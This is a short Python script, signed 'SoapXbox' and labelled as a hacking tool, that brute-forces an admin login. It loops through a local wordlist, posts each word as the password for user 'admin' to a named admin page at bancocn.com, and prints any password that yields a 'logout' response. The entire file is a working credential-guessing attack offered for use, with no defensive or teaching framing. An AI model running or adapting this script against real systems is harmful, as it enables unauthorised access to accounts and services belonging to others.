import requests
from colorama import Fore
from colorama import Style


print(" _   _ _____ _____ ____  ")
print("| | | |_   _|_   _|  _ \ ")
print("| |_| | | |   | | | |_) |")
print("|  _  | | |   | | |  __/ ")
print("| | | | | |   | | | |   ")
print("|_| |_| |_|   |_| |_|   ")
print(" ")
print("              Brute force Login")
print("                    by SoapXbox")
print(" ")
print(" ")
print("--------------------------------")
print(" ")

with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()
    
    for word in wordlist:
        data = {"user" : "admin", "password" : word}
        response = requests.post("http://advanced.bancocn.com/admin/index.php", data = data)
        code = response.status_code
        if "logout" in response.text:
            print("\n ***** FOUND PASSWORD ***** \n")
            print(f"[ + ] - Password found : {Fore.GREEN}{word}{Style.RESET_ALL} code {Fore.GREEN}{code}{Style.RESET_ALL}\n".format(code))            
            print("                    HaCKInG TooL by soapxbox")
        else:
            print(f"[ - ] - Password wrong : {Fore.BLUE}{word}{Style.RESET_ALL} code {Fore.RED}{code}{Style.RESET_ALL}".format(code))
            